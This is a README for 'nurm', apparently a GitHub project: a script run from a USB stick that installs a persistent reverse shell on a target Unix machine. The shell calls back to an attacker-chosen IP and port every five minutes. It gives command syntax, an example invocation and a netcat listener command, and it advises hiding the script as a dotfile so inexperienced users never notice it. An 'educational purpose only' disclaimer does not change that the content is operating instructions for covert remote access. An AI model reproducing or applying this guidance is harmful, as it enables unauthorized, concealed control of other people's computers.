**This project is for educational purpose only**

## What is nurm?
"Now You Are Mine"(nurm) is an automatic reverse shell script that is designed to be placed and run on the target unix computer via the portable usb drive.

## What does it do?
Once run from the usb, nurm will send the reverse shell to any ip address and port that the user specified every five minutes, allowing the following device with the given ip address to access an interactive shell of the target given that the device is listening to the port specified.

## Usage
1) Download the script to your favorite usb stick
2) Run the script on the target machine once.  
   **Usage(v 1.0)**: `./nurm [-a ipaddress] [-p port] [-f full-path-filename]`  
   [ip address] - the ip address that the reverse shell will be sent through.  
   [port] - the port that is used for the udp connection  
   [full-path-filename] - the file with its full path that the reverse shell script will be stored  
3) Use nc -lvp [port] on the ip address  
4) The interactive shell will be sent every 5 minutes

## Example
`./nurm -a 127.168.123.98 -p 8987 -f /home/user1/.test` will create a script that will send the reverse shell to the address 127.168.123.98 at port 8987 and store the script to /home/user1/.test


## Precautions/ Tips
1) Always hide the file with ".". For example, .test. This way, many unexperienced users will never be ware of the script
2) The listening device should either be a server or a computer with static ip address. Otherwise, your computer can only be used once.
3) **This script is for educational purpose only. Don't use it to do illegal activities. You are the only responsible for your actions!**

## Status
Currently only support netcat reverse shell

## Upcoming features
- config files for script customization
- most common language support

